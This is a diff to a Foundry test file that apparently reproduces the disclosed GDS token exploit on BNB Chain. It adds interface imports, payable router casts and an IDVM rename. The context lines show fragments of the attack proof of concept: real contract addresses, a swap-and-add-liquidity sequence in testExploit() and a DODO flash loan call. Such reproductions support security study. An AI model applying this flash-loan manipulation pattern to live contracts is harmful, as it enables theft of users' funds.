@@ -3,6 +3,10 @@ pragma solidity ^0.8.10;
 
 import "forge-std/Test.sol";
 
+import {IERC20Metadata as IERC20} from "src/interfaces/IERC20Metadata.sol";
+import {IUniswapV2Pair} from "src/interfaces/IUniswapV2Pair.sol";
+import {IUniswapV2Router} from "src/interfaces/IUniswapV2Router.sol";
+import {IDVM} from "src/interfaces/IDVM.sol";
 // @Analysis
 // https://twitter.com/peckshield/status/1610095490368180224
 // https://twitter.com/BlockSecTeam/status/1610167174978760704
@@ -35,7 +39,7 @@ contract ClaimReward {
     GDSToken GDS = GDSToken(0xC1Bb12560468fb255A8e8431BDF883CC4cB3d278);
     IERC20 USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
     IUniswapV2Pair Pair = IUniswapV2Pair(0x4526C263571eb57110D161b41df8FD073Df3C44A);
-    IUniswapV2Router Router = IUniswapV2Router(0x10ED43C718714eb63d5aA57B78B54704E256024E);
+    IUniswapV2Router Router = IUniswapV2Router(payable(0x10ED43C718714eb63d5aA57B78B54704E256024E));
     address deadAddress = 0x000000000000000000000000000000000000dEaD;
 
     constructor() {
@@ -67,7 +71,7 @@ contract ContractTest is Test {
     IERC20 USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
     IERC20 WBNB = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
     ISwapFlashLoan swapFlashLoan = ISwapFlashLoan(0x28ec0B36F0819ecB5005cAB836F4ED5a2eCa4D13);
-    IUniswapV2Router Router = IUniswapV2Router(0x10ED43C718714eb63d5aA57B78B54704E256024E);
+    IUniswapV2Router Router = IUniswapV2Router(payable(0x10ED43C718714eb63d5aA57B78B54704E256024E));
     IUniswapV2Pair Pair = IUniswapV2Pair(0x4526C263571eb57110D161b41df8FD073Df3C44A);
     address[] contractList;
     uint256 PerContractGDSAmount;
@@ -83,7 +87,7 @@ contract ContractTest is Test {
     }
 
     function testExploit() public {
-        address(WBNB).call{value: 50 ether}("");
+        (bool success5,) = address(WBNB).call{value: 50 ether}("");
         WBNBToUSDT();
         USDTToGDS(10 * 1e18);
         GDSUSDTAddLiquidity(10 * 1e18, GDS.balanceOf(address(this)));
@@ -113,7 +117,7 @@ contract ContractTest is Test {
 
     function DODOFLashLoan() internal {
         dodoFlashLoanAmount = USDT.balanceOf(dodo);
-        DVM(dodo).flashLoan(0, dodoFlashLoanAmount, address(this), new bytes(1));
+        IDVM(dodo).flashLoan(0, dodoFlashLoanAmount, address(this), new bytes(1));
     }
 
     function DPPFlashLoanCall(address sender, uint256 baseAmount, uint256 quoteAmount, bytes calldata data) external {
